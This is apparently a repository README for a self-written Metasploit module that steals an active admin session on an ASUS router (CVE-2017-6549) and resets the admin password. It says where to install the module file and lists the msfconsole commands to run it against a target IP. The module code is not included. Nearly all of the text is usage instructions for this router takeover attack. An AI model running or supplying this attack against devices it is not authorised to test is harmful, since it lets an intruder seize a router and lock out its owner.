# asus-router-session-steal
Just a simple module I wrote to session steal my old router and change the password
Works by stealing an active admin session and is related to the 
CVE-2017-6549 vulnerability

## Instructions
Move the `.rb` file to `/usr/share/metasploit-framework/modules/exploit/linux/http`

Run the following commands after moving:
```
msfconsole
use exploit/linux/http/session_steal_router
set RHOST <ROUTER_IP_HERE>
set new_pw <INTENDED_PW_HERE>
exploit
```
